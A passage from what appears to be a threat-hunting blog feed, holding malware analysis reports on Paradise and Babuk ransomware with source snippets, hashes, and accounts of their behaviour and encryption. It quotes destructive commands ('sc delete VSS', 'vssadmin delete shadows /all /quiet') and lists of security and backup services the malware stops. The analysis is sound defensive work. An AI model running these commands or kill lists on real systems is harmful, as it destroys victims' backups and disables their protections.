                    &lt;span class=&quot;n&quot;&gt;Drives&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Enqueue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;device&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\\&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;folder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt; 
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Eliminating shadow duplicates is a fairly common practice for ransomware. Even in this instance, executing the following command in cmd.exe is fairly standard:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/6/2023-06-23_12-46.png&quot; alt=&quot;paradise&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;ProcessStartInfo&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;psiOpt&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ProcessStartInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;@&quot;cmd.exe&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;@&quot;/C sc delete VSS&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally, the method by which Paradise encrypts files is yet another strange feature. The ability to encrypt “only” the first &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10MB&lt;/code&gt; of large files is a dubious decision by the malware author. If the files are smaller, they are divided into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;117-byte&lt;/code&gt; chunks and iterated over.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/6/2023-06-23_13-02.png&quot; alt=&quot;paradise&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;iocs&quot;&gt;IOCs&lt;/h3&gt;

&lt;p&gt;SHA-256 of the analyzed files composing the leaked source code:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/6/2023-06-23_13-08.png&quot; alt=&quot;paradise&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;363a99b2480c11b9431c046d44b323807e9b11bf237cc291dde11151d8b75581  ./MainForm.cs
753f1e353ad0eb75555f81e090a3e89339d96266f5e33e2ada34c9ea655dcee9  ./AssemblyInfo.cs
bdbf6eb3afe9056e474d2ca2bec98a866c17b8a66405d1463fc9e8b8a832a65c  ./obj/Debug/.NETFramework,Version&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;v4.5.AssemblyAttributes.cs
6a5c52609d64d0c611b6d0e083f5c8489f8b7e4ff8fbbf4e710b163b1d34d6b3  ./obj/Debug/DP_Builder.csprojAssemblyReference.cache
45ce1722ae08d1ddd4ae590c2ba55dd1a8d61513cb490879ddca1426e8b84983  ./obj/Debug/DesignTimeResolveAssemblyReferences.cache
ab69b565a381aca056b91dda7eacdb507de078f9f98bf263c5414a5842361e9a  ./obj/Debug/DesignTimeResolveAssemblyReferencesInput.cache
5eb2c22d092f3bf2077d7e9128c38c1bc29fd0b06479646c05afb0bf741891dc  ./MainForm.resx
07958ee0ed74c8e4637d0903d686e66e7bd9e6b89bca0d3df4531d590c848a05  ./Properties/Settings.cs
e9ae7a5837b34b65608964e7315450a3459e0e01366769b68b904504a55db102  ./Properties/Resources.resx
a1428e2c84c3420a0481e524e103db7fde84d2107bd02738349c48ee4d6a5353  ./Properties/Resources.cs
0dfb6a940a583432f21ce03634c0e8d6a9030443e391cf44f9581212716d4308  ./DP_Builder.sln
f282d765bb83d76be318a2a982605d06619da2376165ba12cc6ca4e50aa0754d  ./Program.cs
e375edc127182453ad7ed84ae3abac3759dded7265284af48015a165e439f26c  ./DP_Builder.csproj
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;

&lt;p&gt;The leaked source code of the Paradise Ransomware provides an invaluable insight into the working mechanisms of this persistent threat. The variant in question is written in .NET, highlighting the shift in language preference by threat actors for its simplicity and extensive library support. Although it would seem that now the threat is already less, but still, even today there are such ransomes as &lt;a href=&quot;https://www.trendmicro.com/en_us/research/23/d/rapture-a-ransomware-family-with-similarities-to-paradise.html&quot;&gt;Rapture&lt;/a&gt;, a Ransomware Family With Similarities to Paradise&lt;/p&gt;

&lt;p&gt;By Cyber Threat Hunters from MSSPLab:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/in/zhassulan-zhussupov-5a347419b/&quot;&gt;@cocomelonc&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/in/aruzhan-kaldybek-775735226&quot;&gt;@wqkasper&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/in/madiyar-mukhamadiyev-306b37239/&quot;&gt;@mgmadr&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/TheBadKitten/Paradise-Ransomware&quot;&gt;https://github.com/TheBadKitten/Paradise-Ransomware&lt;/a&gt;   &lt;br /&gt;
&lt;a href=&quot;https://github.com/vxunderground/MalwareSourceCode/tree/main/Win32/Ransomware&quot;&gt;https://github.com/vxunderground/MalwareSourceCode/tree/main/Win32/Ransomware&lt;/a&gt;    &lt;br /&gt;
&lt;a href=&quot;https://malpedia.caad.fkie.fraunhofer.de/details/win.paradise&quot;&gt;https://malpedia.caad.fkie.fraunhofer.de/details/win.paradise&lt;/a&gt;   &lt;br /&gt;
&lt;a href=&quot;https://www.trendmicro.com/en_us/research/23/d/rapture-a-ransomware-family-with-similarities-to-paradise.html&quot;&gt;Rapture, a Ransomware Family With Similarities to Paradise&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Thanks for your time happy hacking and good bye!       &lt;br /&gt;
&lt;em&gt;All drawings and screenshots are MSSPLab’s&lt;/em&gt;&lt;/p&gt;</content><author><name>MSSP Lab</name></author><category term="threat-hunting" /><category term="blueteam" /><category term="malware" /><category term="malwareanalysis" /><summary type="html">Paradise Ransomware is a type of malware that encrypts the files on the victims’ systems and then demands a ransom to recover the data. This ransomware family first appeared in 2017 and continues to be active with numerous variants identified over the years. The ransomware typically targets Windows operating systems, and it is distributed through multiple infection vectors, including malicious email attachments, compromised Remote Desktop Protocol (RDP), and exploit kits.</summary></entry><entry><title type="html">Malware analysis report: Babuk ransomware</title><link href="http://localhost:4001/threat-hunting/2023/06/15/malware-analysis-babuk.html" rel="alternate" type="text/html" title="Malware analysis report: Babuk ransomware" /><published>2023-06-15T05:00:00+03:00</published><updated>2023-06-15T05:00:00+03:00</updated><id>http://localhost:4001/threat-hunting/2023/06/15/malware-analysis-babuk</id><content type="html" xml:base="http://localhost:4001/threat-hunting/2023/06/15/malware-analysis-babuk.html">&lt;p&gt;&lt;strong&gt;Babuk&lt;/strong&gt; is a ransomware family that was first discovered in early 2021. It quickly became infamous, especially among corporate networks, for its ability to quickly encrypt files and demand ransom. However, the decisive moment in its development was the leak of the source code, which subsequently contributed to the spread of new ransomware variants.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/5/babuk.png&quot; alt=&quot;apt29&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;threat-actor&quot;&gt;Threat actor&lt;/h3&gt;

&lt;p&gt;&lt;em&gt;Babuk&lt;/em&gt;, also known as &lt;em&gt;Team Babuk&lt;/em&gt;, is a criminal group that developed and distributed the Babuk ransomware. The group was first discovered in early 2021 and since then they have been seen in several major cyberattacks, especially against corporate networks.     &lt;br /&gt;
Unlike many other cybercriminal groups, Babuk was so fearless that they even threatened to release the stolen data if they did not receive a ransom. In fact, they even set up their own website, &lt;em&gt;“Babuk Locker’s Leak Site”&lt;/em&gt;, where they posted details of victims who refused to pay.     &lt;br /&gt;
Like many similar groups, Babuk operates on a Ransomware-as-a-Service (RaaS) model, where they offer their services to other cybercriminals for a share of the ransom.&lt;/p&gt;

&lt;h3 id=&quot;distributed-amd-infiltration&quot;&gt;Distributed amd Infiltration&lt;/h3&gt;

&lt;p&gt;Babuk is typically distributed through phishing campaigns that use infected attachments or links. Infiltration: After effectively infiltrating the system, Babuk begins encrypting files using its own encryption algorithm based on the Salsa20 and RSA ciphers.&lt;/p&gt;

&lt;h3 id=&quot;post-infection-behavior&quot;&gt;Post-Infection Behavior&lt;/h3&gt;

&lt;p&gt;&lt;em&gt;Babuk&lt;/em&gt; changes the extension of encrypted files to include its own unique extension and leaves a ransom message to restore the files. Babuk also removes spear shadows and backups to increase pressure on the victim.&lt;/p&gt;

&lt;h3 id=&quot;identification&quot;&gt;Identification&lt;/h3&gt;

&lt;p&gt;Sample is being investigated:&lt;/p&gt;

&lt;p&gt;&lt;em&gt;sample.exe&lt;/em&gt;:&lt;/p&gt;

&lt;p&gt;File size: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;31232 bytes&lt;/code&gt;  &lt;br /&gt;
MD5 sum: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;e10713a4a5f635767dcd54d609bed977&lt;/code&gt;   &lt;br /&gt;
SHA-1 sum: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;320d799beef673a98481757b2ff7e3463ce67916&lt;/code&gt;  &lt;br /&gt;
SHA-256 sum: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8203c2f00ecd3ae960cb3247a7d7bfb35e55c38939607c85dbdb5c92f0495fa9&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;First of all, check our sample via VirusTotal:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.virustotal.com/gui/file/8203c2f00ecd3ae960cb3247a7d7bfb35e55c38939607c85dbdb5c92f0495fa9/detection&quot;&gt;https://www.virustotal.com/gui/file/8203c2f00ecd3ae960cb3247a7d7bfb35e55c38939607c85dbdb5c92f0495fa9/detection&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/5/2023-06-15_09-45.png&quot; alt=&quot;vt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;As we can see, 63 of 70 AV engines detect our sample as malicious.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This sample is written in C++. protects its keys and encrypts files using its own implementation of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SHA256&lt;/code&gt; hashing, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ChaCha8&lt;/code&gt; encryption, and Elliptic-curve Diffie–Hellman (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ECDH&lt;/code&gt;) key generation and exchange algorithm. Similar to other ransomware, it can propagate its encryption by enumerating available network resources.&lt;/p&gt;

&lt;h3 id=&quot;static-analysis&quot;&gt;Static analysis&lt;/h3&gt;

&lt;p&gt;The specified sample is a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;32-bit&lt;/code&gt; PE file:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;file &amp;lt;sample.exe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/5/2023-06-15_09-57.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hexdump &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; &amp;lt;sample.exe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/5/2023-06-15_09-58.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exiftool&lt;/code&gt; for looking metadata:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;exiftool &amp;lt;sample.exe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/5/2023-06-15_10-01.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;File timestamp is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2020:12:30 14:03:14+03:00&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Shannon entropy of the sections in the sample:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/5/2023-06-15_10-03.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Compiled via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Visual Studio 2019 16.7[GUI32]&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/5/2023-06-15_11-34.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;and not packed:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/5/2023-06-15_11-36.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ransom note from Babuk:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/5/2023-06-15_11-44.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/5/2023-06-15_11-59.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;dynamic-analysis&quot;&gt;Dynamic analysis&lt;/h3&gt;

&lt;p&gt;Babuk is capable of operating with or without command line parameters. If no parameter is specified, encryption is limited to local devices only:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/5/2023-06-15_12-16.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-nolan&lt;/code&gt; - Not encrypting LAN    &lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-lansecond&lt;/code&gt; - Encrypting LAN after files (first encrypting files and then LAN)           &lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-lanfirst&lt;/code&gt; - Encrypting LAN first and then files&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Terminating processes&lt;/strong&gt; - Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateToolhelp32Snapshot&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Process32FirstW&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Process32NextW&lt;/code&gt; to investigate all of the running processes on the system, Babuk can iterate and search for processes that need to be closed. It will execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TerminateProcess&lt;/code&gt; to terminate any found processes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/5/2023-06-15_12-06.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here is the list of processes to be closed:&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;sql.exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;oracle.exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ocssd.exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dbsnmp.exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;synctime.exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;agntsvc.exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;isqlplussvc.exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xfssvccon.exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mydesktopservice.exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ocautoupds.exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;encsvc.exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;firefox.exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tbirdconfig.exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mydesktopqos.exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ocomm.exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dbeng50.exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sqbcoreservice.exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;excel.exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;infopath.exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msaccess.exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mspub.exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onenote.exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;outlook.exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;powerpnt.exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;steam.exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;thebat.exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;thunderbird.exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;visio.exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;winword.exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;wordpad.exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;notepad.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Shadow copies&lt;/strong&gt; - Babuk attempts to remove shadow duplicates prior to and following encryption:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/5/2023-06-15_12-11.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Before invoking &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ShellExecuteW&lt;/code&gt; to execute the following command:&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;cmd.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/c&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;vssadmin.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;delete&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;shadows&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/all&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/quiet&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wow64DisableWow64FsRedirection&lt;/code&gt; is called to disable file system redirection.&lt;/p&gt;

&lt;p&gt;After removing the shadow copies, Babuk verifies whether the system is powered by a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;64-bit&lt;/code&gt; processor. If so, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wow64RevertWow64FsRedirection&lt;/code&gt; is invoked to re-enable file system redirection.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Terminating services&lt;/strong&gt; - The authors of Babuk hard-coded a list of services that must be terminated prior to encryption.    &lt;br /&gt;
Babuk will call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EnumDependentServicesA&lt;/code&gt; prior to terminating a service to retrieve the name and status of each dependent service.    &lt;br /&gt;
It will then invoke &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ControlService&lt;/code&gt; with the control code &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SERVICE_CONTROL_STOP&lt;/code&gt; to halt them prior to terminating the primary service in the same manner:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/5/2023-06-15_12-50.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;List of services:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vss, sql, svc&lt;span class=&quot;nv&quot;&gt;$,&lt;/span&gt; memtas, mepocs, sophos, veeam, backup, GxVss, GxBlr, GxFWD, GxCVD, GxCIMgr, DefWatch, ccEvtMgr,
ccSetMgr, SavRoam, RTVscan, QBFCService, QBIDPService, Intuit.QuickBooks.FCS, QBCFMonitorService, YooBackup,
YooIT, zhudongfangyu, sophos, stc_raw_agent, VSNAPVSS, VeeamTransportSvc, VeeamDeploymentService, VeeamNFSSvc,
veeam, PDVFSService, BackupExecVSSProvider, BackupExecAgentAccelerator, BackupExecAgentBrowser,
BackupExecDiveciMediaService, BackupExecJobEngine, BackupExecManagementService, BackupExecRPCService,
AcrSch2Svc, AcronisAgent, CASAD2DWebSvc, CAARCUpdateSvc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Encryption logic&lt;/strong&gt; - the most interesting part of our research. First, Babuk generates four random buffers using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RtlGenRandom&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/5/2023-06-15_13-05.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;RtlGenRandom - This function is available as a resource named SystemFunction036 in Advapi32.dll.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Two are utilized as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ChaCha8&lt;/code&gt; keys, while the remaining two are utilized as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ChaCha8&lt;/code&gt; nonces.&lt;/p&gt;

&lt;p&gt;Next, the second &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ChaCha8&lt;/code&gt; key will be encrypted using the first key and nonce. The first key is then encrypted using the second key and nonce that have been encrypted.&lt;/p&gt;

&lt;p&gt;The elliptic-curve Diffie–Hellman (ECDH) private key for the local machine is considered to be this encrypted first key. Using the code contained in &lt;a href=&quot;https://github.com/kokke/tiny-ECDH-c&quot;&gt;this ECDH library&lt;/a&gt;, Babuk will now build a local ECDH public key based on the private key that was provided.&lt;/p&gt;

&lt;p&gt;After that, it will produce a shared secret by utilizing the local private key and the author’s public key that has been hard-coded.&lt;/p&gt;

&lt;p&gt;This commonly known fact is hashed with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SHA256&lt;/code&gt; technique to produce two &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ChaCha8&lt;/code&gt; keys. These keys are subsequently utilized in the process of encrypting files.&lt;/p&gt;

&lt;p&gt;In this report, we would like to dwell in more detail on the cryptographic logic of our ransomware family. So, in order to understand the work of the ransomware a little deeper, we will give a small theoretical definition.&lt;/p&gt;

&lt;h3 id=&quot;ecc&quot;&gt;ECC&lt;/h3&gt;

&lt;p&gt;Babuk Ransomware is a sophisticated ransomware compiled for several platforms, uses an Elliptic Curve Algorithm (Montgomery Algorithm) to build the encryption keys.&lt;/p&gt;

